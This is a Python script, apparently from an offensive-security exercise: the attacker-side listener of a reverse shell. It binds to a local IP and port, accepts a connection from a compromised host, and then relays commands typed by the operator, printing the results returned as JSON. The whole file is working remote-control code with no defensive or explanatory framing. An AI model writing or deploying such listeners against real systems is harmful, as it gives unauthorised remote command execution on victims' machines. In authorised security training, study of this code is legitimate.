#!/usr/bin/python

import socket
from termcolor import colored
import json
def relibale_send(data):
        json_data = json.dumps(data)
        target.send(bytes(json_data, 'utf-8'))

def reliable_recv():
        data = ""
        while True:
                try :
                        data = data + str(target.recv(1024).decode("utf-8"))
                        return json.loads(data)
                except ValueError:
                        continue



def shell():
	while True:
		command = input("* Shell#-%s: " % str(ip))
		relibale_send(command)
		if command =='q':
			break
		else:
			result = reliable_recv()
			print(result)




def server():
	global s
	global ip
	global target
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
	s.bind(("192.168.0.21", 54321))
	s.listen(5)

	print(colored("[+] Listening for incoming Conncection","green"))
	target , ip = s.accept()
	print(target)
	print(colored("[+] Connection Established fpr : %s  " % str(ip) , "green"))
	

server()
shell()
s.close()
